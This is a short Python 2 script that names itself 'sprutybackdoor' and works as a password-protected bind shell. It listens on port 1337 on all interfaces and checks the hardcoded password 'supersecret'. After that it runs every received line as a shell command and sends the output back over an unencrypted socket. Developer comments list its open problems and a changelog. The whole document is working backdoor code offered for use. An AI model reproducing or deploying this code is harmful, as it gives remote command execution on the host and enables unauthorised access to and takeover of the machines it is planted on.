import socket
import subprocess
from subprocess import Popen, PIPE, STDOUT
from time import gmtime, strftime
# CURRENT PROBLEMS:
# - CD doesn't change the directory, which makes navigation a bitch.
# [FIXED] + If 'check_output' get's an error, the whole server module crashes. Also: proper ERROR output
# - If the server isn't properly closed, it stays open for a while making it impossible to restart.
# - The connection isn't encrypted, and can therefore easily be monitored
# - The password is visible when typing, making 'over the shoulder' a problem
# - There is currently no proper 'log', apart from the 'print' in the server window.
# CHANGELOG: 
# [23:38] Cleaned up the code, made proper functions etc.
#
def getip():
	proc2=subprocess.Popen("ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1'", shell=True, stdout=subprocess.PIPE, )
	output2=proc2.communicate()[0]
	filtr1=list(output2)
	del filtr1[-1]
	ip=''.join(filtr1)
	return ip;
	
def getwho():
	proc3=subprocess.Popen("whoami", shell=True, stdout=subprocess.PIPE, )
	output3=proc3.communicate()[0]
	who = output3.split()[0]
	return who;
	
def timestamp():
	time = "[" + strftime("%Y-%m-%d %H:%M:%S") + "]"
	return time;
	

HOST = ''                 # Symbolic name meaning all available interfaces
PORT = 1337              # Arbitrary non-privileged port
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((HOST, PORT))
s.listen(1)
conn, addr = s.accept()
history = ['']
print 'Connected by', addr
#COMMENT OUT THE "ip = getip()"F YOU'RE WITHOUT A LAN/WLAN
ip = getip()
who = getwho()
locked = 1
while True:
	conn.sendall("""

|	   #####  ######  ######  #     # ####### 	|
|	  #     # #     # #     # #     #    #    	|
|	  #       #     # #     # #     #    #    	|
|	   #####  ######  ######  #     #    #    	|
|	        # #       #   #   #     #    #    	|
|	  #     # #       #    #  #     #    #    	|
|	   #####  #       #     #  #####     #    	|
|         ~^^sprutybackdoor@port1337^^~			|
|          !!3NT3R P4$$W0RD T0 3NT3R!!			|
PASSWORD: """)
	data = conn.recv(1024)	
	password = data.split()[0]
	if not data: break
	print password
	if password == "supersecret":
		while True:
			conn.sendall("%s@%s~$ " % (who, ip))
			data = conn.recv(1024)
			if not data: break
			#If the command is preset here then do (?)
			if data.split()[0] == "test": #THIS IS A TEMPLATE; USE 'elif' IF YOU NEED MORE
				print "ITS WORKING"
			#Otherwise, run it in shell
			else: 
				log_add = timestamp() + ' ' + data
				print log_add
				p = Popen(data, shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT, close_fds=True)
				output = p.stdout.read()
				print output
				conn.sendall(output)
	conn.close()
